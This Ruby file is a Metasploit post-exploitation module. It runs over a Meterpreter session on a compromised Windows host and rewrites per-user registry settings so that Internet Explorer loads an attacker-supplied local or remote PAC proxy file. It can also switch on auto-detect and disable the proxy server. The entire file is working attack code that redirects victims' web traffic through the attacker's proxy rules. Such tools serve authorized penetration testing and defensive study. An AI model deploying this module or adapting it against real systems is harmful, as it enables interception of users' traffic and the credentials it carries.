##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Proxy PAC File',
        'Description' => %q{
          This module configures Internet Explorer to use a PAC proxy file. By using the LOCAL_PAC
          option, a PAC file will be created on the victim host. It's also possible to provide a
          remote PAC file (REMOTE_PAC option) by providing the full URL.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
        'References' => [
          [ 'URL', 'https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1' ],
          [ 'URL', 'http://blog.scriptmonkey.eu/bypassing-group-policy-using-the-windows-registry' ]
        ],
        'Platform' => 'win',
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_getenv
            ]
          }
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptPath.new('LOCAL_PAC', [false, 'Local PAC file.' ]),
        OptString.new('REMOTE_PAC', [false, 'Remote PAC file. (Ex: http://192.168.1.20/proxy.pac)' ]),
        OptBool.new('DISABLE_PROXY', [true, 'Disable the proxy server.', false]),
        OptBool.new('AUTO_DETECT', [true, 'Automatically detect settings.', false])
      ]
    )
  end

  def run
    if datastore['LOCAL_PAC'].blank? && datastore['REMOTE_PAC'].blank?
      fail_with(Failure::BadConfig, 'You must set a remote or local PAC file. Aborting...')
    end

    if datastore['REMOTE_PAC']
      @remote = true
      print_status('Setting automatic configuration script from a remote PAC file ...')
      res = enable_proxypac(datastore['REMOTE_PAC'])
    else
      @remote = false
      print_status('Setting automatic configuration script from local PAC file ...')
      pac_file = create_pac(datastore['LOCAL_PAC'])
      unless pac_file
        print_error('There were problems creating the PAC proxy file. Aborting...')
        return
      end
      res = enable_proxypac(pac_file)
    end
    unless res
      print_error('Error while setting an automatic configuration script. Aborting...')
      return
    end

    print_good('Automatic configuration script configured...')

    if datastore['AUTO_DETECT']
      print_status('Enabling Automatically Detect Settings...')
      unless auto_detect_on
        print_error('Failed to enable Automatically Detect Settings. Proceeding anyway...')
      end
    end

    if datastore['DISABLE_PROXY']
      print_status('Disabling the Proxy Server...')
      unless disable_proxy
        print_error('Failed to disable Proxy Server. Proceeding anyway...')
      end
    end
  end

  def create_pac(local_pac)
    pac_file = session.sys.config.getenv('APPDATA') << '\\' << "#{Rex::Text.rand_text_alpha(6..13)}.pac"

    unless ::File.exist?(local_pac)
      print_error('Local PAC file not found.')
      return false
    end

    conf_pac = ::File.open(local_pac, 'rb').read

    return false unless write_file(pac_file, conf_pac)

    print_status("PAC proxy configuration file written to #{pac_file}")
    return pac_file
  end

  def enable_proxypac(pac)
    proxy_pac_enabled = false

    registry_enumkeys('HKU').each do |k|
      next unless k.include?('S-1-5-21')
      next if k.include?('_Classes')

      key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
      value_auto = 'AutoConfigURL'
      file = @remote ? pac.to_s : "file://#{pac}"

      begin
        res = registry_setvaldata(key, value_auto, file, 'REG_SZ')
      rescue ::RuntimeError, Rex::TimeoutError
        next
      end

      if res.nil? # Rex::Post::Meterpreter::RequestError
        next
      end

      if change_connection(16, '05', key + '\\Connections')
        proxy_pac_enabled = true
      end
    end

    proxy_pac_enabled
  end

  def auto_detect_on
    auto_detect_enabled = false

    registry_enumkeys('HKU').each do |k|
      next unless k.include? 'S-1-5-21'
      next if k.include? '_Classes'

      key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings\\Connections"
      if change_connection(16, '0D', key)
        print_good('Automatically Detect Settings on.')
        auto_detect_enabled = true
      end
    end

    auto_detect_enabled
  end

  def disable_proxy
    value_enable = 'ProxyEnable'
    profile = false

    registry_enumkeys('HKU').each do |k|
      next unless k.include?('S-1-5-21')
      next if k.include?('_Classes')

      key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
      begin
        registry_setvaldata(key, value_enable, 0, 'REG_DWORD')
        profile = true
      rescue ::RuntimeError, Rex::TimeoutError
        next
      end
    end

    if profile
      print_good('Proxy disabled.')
      return true
    end

    return false
  end

  def change_connection(offset, value, key)
    value_default = 'DefaultConnectionSettings'
    begin
      value_con = registry_getvaldata(key, value_default)
      binary_data = value_con.unpack('H*')[0]
      binary_data[offset, 2] = value
      registry_setvaldata(key, value_default, ['%x' % binary_data.to_i(16)].pack('H*'), 'REG_BINARY')
    rescue ::RuntimeError, Rex::TimeoutError
      return false
    end

    return true
  end
end
